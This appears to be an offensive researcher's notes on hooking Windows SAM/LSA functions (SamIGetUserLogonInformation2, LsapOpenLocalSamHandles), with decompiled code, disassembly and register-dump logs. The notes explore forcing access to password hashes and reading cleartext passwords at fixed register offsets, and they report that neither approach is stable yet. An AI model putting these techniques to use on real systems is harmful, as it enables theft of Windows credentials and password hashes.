		goto _END_OF_FUNC;
     }

	 // 6) Check if the DS is available
	 if (SampUseDsData) 
     {
        DsrmBehavior = SampDsrmAdminBehavior;

        // if DsrmBehavior == 0 (use DS), or == 1 AND DS is up, then DS mode

        if (DsrmBehavior == 0 || ( DsrmBehavior == 1 && (bIsDsRunning = SampDsIsRunning(), bIsDsRunning) ) )
        {
            // increment active-threads count
            STATUS = SampIncrementActiveThreads();
            if (!NT_SUCCESS(STATUS)) 
            {
                //
                // WPP tracing::: WPP_SF_D( TRACE_LEVEL_WARNING, TraceGUIDs, STATUS );
                //
                goto _END_OF_FUNC;
            
            }

            //
            // --- dynamic DS-extension dispatch ---
            // DomainHandle embeds a domain-index at offset 0xC8; 
            // use it to find our DS-extension vtable entry.
            //
            // ULONG uIdx = *(ULONG*)((BYTE*)DomainHandle + 0xC8);
            // PSAMP_DEFINED_DOMAIN pSamDefDomain = &SampDefinedDomains[uIdx];
            
            // STATUS = pSamDefDomain->DsExtension->GetUserLogonInformation(
			// STATUS = SampExtGetUserLogonInformationDs(
            
            //               DomainHandle,
            //               LookupFlags,
            //               &LocalName,
            //               WhichFields,
            //               ExtendedFields,
            //               UserInfo,
            //               LocalMembership,
            //               LocalUserHandle
            //          );
            //

            // decrement thread count
            SampDecrementActiveThreads();
        }
        else 
        {
            // DS is unavailable 
            STATUS = STATUS_DS_UNAVAILABLE;      // 0xC0000064
            //
            // WPP tracing::: WPP_SF_D( TRACE_LEVEL_ERROR, TraceGUIDs, STATUS );
            //    
        }
    }
    else 
    {
        // 7) Registry-mode helper
        STATUS = SampGetUserLogonInformationRegistryMode(
                     DomainHandle,
                     LookupFlags,
                     ExtendedFields,
                     UserInfo,
                     LocalMembership,
                     LocalUserHandle
                 );
    }

_END_OF_FUNC:
	if (bHeapAllocated) 
    {
		g_pfnFree(NameBuffer);
	}
	return STATUS;
}
*/

/*

#define USER_ALL_BASIC_INFO_MASK  \
    (USER_ALL_USERNAME       | \
     USER_ALL_FULLNAME       | \
     USER_ALL_PRIMARYGROUPID | \
     USER_ALL_ADMINCOMMENT)


-> Windows is forcing the WhichFields to be 0x1B (USER_ALL_BASIC_INFO_MASK) in the @samsrv!SamIGetUserLogonInformation2 and @lsasrv!LsapSamExtGetUserLogonInformation2 functions
-> USER_ALL_BASIC_INFO_MASK is not defined in ntsam.h (its defined above - you can see why its 'basic')
-> Maybe set WhichFields to USER_ALL_READ_TRUSTED_MASK2:
   USER_ALL_READ_TRUSTED_MASK2 = USER_ALL_READ_TRUSTED_MASK (https://github.com/winsiderss/phnt/blob/master/ntsam.h#L1275C9-L1275C36) + USER_ALL_OWFPASSWORD
-> However, to set WhichFields, we need to make sure that whoever populates the domain handle 
   (which is set to g_hIdProvExtSamAccountDomain by @lsasrv!LsapSamExtGetUserLogonInformation2)  
   Is given the enough access to use USER_ALL_READ_TRUSTED_MASK2
-> USER_ALL_READ_TRUSTED_MASK2 is defined below:

#define USER_ALL_READ_TRUSTED_MASK2 \
    (USER_ALL_NTPASSWORDPRESENT | \
    USER_ALL_LMPASSWORDPRESENT | \
    USER_ALL_OWFPASSWORD | \
    USER_ALL_PASSWORDEXPIRED | \
    USER_ALL_SECURITYDESCRIPTOR | \
    USER_ALL_PRIVATEDATA)

*/



/*
-> g_hIdProvExtSamAccountDomain is populated by two functions in lsasrv.dll


1. LsapLazyInitSamConnection

    // .....

    loc_180027A7E:
    lea     rax, ?g_IdProvExtDomainSid@@3PEAXEA ; void * g_IdProvExtDomainSid
    mov     r8d, 2000000h   ; unsigned int
    mov     [rsp+48h+var_18], rax ; void **
    lea     r9, ?g_hIdProvExtSamAccountDomain@@3PEAXEA ; void **
    and     [rsp+48h+var_20], 0
    lea     rdx, ?g_hIdProvExtSamServer@@3PEAXEA ; void **
    mov     cl, 1           ; unsigned __int8
    mov     [rsp+48h+var_28], r8d ; unsigned int
    call    ?LsapOpenLocalSamHandles@@YAJEPEAPEAXK0K00@Z ; LsapOpenLocalSamHandles(uchar,void * *,ulong,void * *,ulong,void * *,void * *)
    mov     ebx, eax
    test    eax, eax
    jns     short loc_180027AC6


    // .....


2. LsapFindConnectedUserByLocalName

	// .....
	mov     rax, [rsp+48h+var_28]
	mov     r8d, 2000000h   ; unsigned int
	lea     r9, ?g_hIdProvExtSamAccountDomain@@3PEAXEA ; void **
	and     [rsp+48h+var_20], 0
	lea     rdx, ?g_hIdProvExtSamServer@@3PEAXEA ; void **
	mov     cl, 1           ; unsigned __int8
	call    ?LsapOpenLocalSamHandles@@YAJEPEAPEAXK0K00@Z ; LsapOpenLocalSamHandles(uchar,void * *,ulong,void * *,ulong,void * *,void * *)
	mov     ebx, eax
	test    eax, eax
	jns     short loc_180027AC6
	// .....


-> Both of these functions are calling LsapOpenLocalSamHandles like this:

LsapOpenLocalSamHandles(
    flags,                        ; CL = provider index (0x1 for built-in SAM)
    &g_hIdProvExtSamServer,       ; RDX = out server handle
    0x02000000,                   ; R8  = DesiredServerAccess
    &g_hIdProvExtSamAccountDomain,; R9  = out domain handle
    0x02000000,                   ; [rsp] = DesiredDomainAccess
    &g_IdProvExtDomainSid,        ; [rsp+8] = out domain SID
    NULL                          ; [rsp+12] = out SID length
)

-> 0x02000000 is MAXIMUM_ALLOWED (not sure), so maybe we can already set it to USER_ALL_READ_TRUSTED_MASK2 instead of the forced USER_ALL_BASIC_INFO_MASK
*/






/*
@1 Compiled with PRINT_CTX
@2 Get-Content C:\DummyDebug.log -Encoding Unicode | Where-Object { $_ -match '\[i\] Thread Context|\[i\] R9:' }


[i] Thread Context [ #1 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #2 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #3 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #4 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #5 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #6 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #7 ]:
[i] R9: 0x0000000023000000
[i] Thread Context [ #8 ]:
[i] R9: 0x00000000000003C0
[i] Thread Context [ #9 ]:
[i] R9: 0x0000000000100004
[i] Thread Context [ #10 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #11 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #12 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #13 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #14 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #15 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #16 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #17 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #18 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #19 ]:
[i] R9: 0x0000000023000000
[i] Thread Context [ #20 ]:
[i] R9: 0x00000000000003C0
[i] Thread Context [ #21 ]:
[i] R9: 0x0000000000100004
[i] Thread Context [ #22 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #23 ]:
[i] R9: 0x0000000000000004
[i] Thread Context [ #24 ]:
[i] R9: 0x0000000000000004

-> These values correspond to the following:

1. 0x0000000000000004 = USER_ALL_USERID
2. 0x0000000023000000 = USER_ALL_NTPASSWORDPRESENT  | USER_ALL_LMPASSWORDPRESENT  | USER_ALL_OWFPASSWORD 
3. 0x00000000000003C0 = USER_ALL_HOMEDIRECTORY  | USER_ALL_HOMEDIRECTORYDRIVE  | USER_ALL_SCRIPTPATH  | USER_ALL_PROFILEPATH
4. 0x0000000000100004 = USER_ALL_NTPASSWORDPRESENT  | USER_ALL_USERID 

-> All are forced to be 0x1B 
-> However, we can force set 'WhichFields' to be USER_ALL_READ_TRUSTED_MASK2 when its passed as 0x0000000023000000
-> USER_ALL_READ_TRUSTED_MASK2 is equal to 0x3F000000

@3 Get-Content C:\DummyDebug.log -Encoding Unicode | Where-Object { $_ -match '\[i\] Thread Context|\[i\] Rdx:' }

[i] Thread Context [ #1 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #2 ]:
[i] Rdx: 0x0000000000000000
[i] Thread Context [ #3 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #4 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #5 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #6 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #7 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #8 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #9 ]:
[i] Rdx: 0x0000000000008000
[i] Thread Context [ #10 ]:
[i] Rdx: 0x0000000000000080
[i] Thread Context [ #11 ]:
[i] Rdx: 0x0000000000000080
[i] Thread Context [ #12 ]:
[i] Rdx: 0x0000000000000080
[i] Thread Context [ #13 ]:
[i] Rdx: 0x0000000000000080
[i] Thread Context [ #14 ]:
[i] Rdx: 0x0000000000000080
[i] Thread Context [ #15 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #16 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #17 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #18 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #19 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #20 ]:
[i] Rdx: 0x0000000000004000
[i] Thread Context [ #21 ]:
[i] Rdx: 0x0000000000008000
[i] Thread Context [ #22 ]:
[i] Rdx: 0x0000000000000080
[i] Thread Context [ #23 ]:
[i] Rdx: 0x0000000000000080
[i] Thread Context [ #24 ]:
[i] Rdx: 0x0000000000000080

@4 Get-Content C:\DummyDebug.log -Encoding Unicode | Where-Object { $_ -match '\[i\] Thread Context|\[i\] Rsi:' }

[i] Thread Context [ #1 ]:
[i] Rsi: 0x0000000000004000
[i] Thread Context [ #2 ]:
[i] Rsi: 0x0000000000000001
[i] Thread Context [ #3 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #4 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #5 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #6 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #7 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #8 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #9 ]:
[i] Rsi: 0x000000EBE167D5C8
[i] Thread Context [ #10 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #11 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #12 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #13 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #14 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #15 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #16 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #17 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #18 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #19 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #20 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #21 ]:
[i] Rsi: 0x000000EBE13FD858
[i] Thread Context [ #22 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #23 ]:
[i] Rsi: 0x00007FFCBCE33D20
[i] Thread Context [ #24 ]:
[i] Rsi: 0x00007FFCBCE33D20
*/


/*
@ NOTE: Remember that SamIGetUserLogonInformation2 is a wrapper for SampGetUserLogonInformation. 

@ RESULT:
-> Failure when forcing the 'WhichFields' parameter in SampGetUserLogonInformation. The function will return STATUS_INVALID_INFO_CLASS (0xC0000003)

@ SUBSTITUTION (1):
-> At the start of SamIGetUserLogonInformation2, hook and read:
* R8            // Username                     | dt _UNICODE_STRING @r8
* R8 + 0x10     // ??                           | dt _UNICODE_STRING @r8+0x10
* R8 + 0x20     // Workstaion                   | dt _UNICODE_STRING @r8+0x20    
* R8 + 0x30     // Password                     | dt _UNICODE_STRING @r8+0x30
-> Only read when SampGetUserLogonInformation's RSI and RDX are 0x4000. Because this is a 'Dry-Run' (Password have a higher chance of existing at the mentioned offset).
-> On this 'Dry-Run' SampGetUserLogonInformation returns 0xC0000073 (STATUS_NONE_MAPPED)

@ SUBSTITUTION (2):
-> At the start of SamIGetUserLogonInformation2, hook and save the pointer to the PUSER_INTERNAL6_INFORMATION structure. 
-> At the end of SamIGetUserLogonInformation2, hook and read the saved PUSER_INTERNAL6_INFORMATION pointer.
   

@ NOTE: Both solutions are not stable.

@ Requires More Research
*/
